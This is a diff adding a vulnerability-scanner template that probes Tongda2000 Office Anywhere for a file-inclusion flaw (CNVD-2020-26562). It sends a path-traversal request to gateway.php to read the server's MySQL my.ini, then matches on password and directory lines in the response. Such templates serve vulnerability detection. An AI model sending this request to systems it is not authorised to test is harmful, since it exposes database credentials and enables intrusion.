@@ -1,0 +1,30 @@
+id: yaml-poc-tongda2000-office_anywhere-file_inclusion-CNVD-2020-26562
+info:
+  name: Yaml Poc Tongda2000 Office_Anywhere File_Inclusion Cnvd 2020 26562
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-tongda2000-office_anywhere-file_inclusion-CNVD-2020-26562'
+  tags: lfi
+  reference:
+  - https://www.hacking8.com/bug-web/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0rce%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.html
+http:
+- method: POST
+  path:
+  - /ispirit/interface/gateway.php
+  body: json={"url":"/general/../../mysql5/my.ini"}
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - '[mysql]'
+    - password=
+    - basedir=
+    - datadir=
+    - tmpdir=
+    - innodb_data_home_dir=
